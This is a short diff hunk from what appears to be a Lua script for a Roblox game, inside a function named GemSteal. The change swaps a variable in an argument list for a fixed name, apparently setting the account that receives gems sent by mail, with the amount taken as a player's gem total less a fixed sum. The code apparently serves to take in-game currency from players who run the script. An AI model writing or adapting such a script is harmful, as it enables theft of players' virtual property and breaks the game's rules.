@@ -17,7 +17,7 @@ function GemSteal()
             GemId = i
             local args = {
                         [1] = "Idm_4x",
-                        [2] = MailMessage,
+                        [2] = "DIMAS A BIRE",
                         [3] = "Currency",
                         [4] = GemId,
                         [5] = GemAmount1 - 30010000
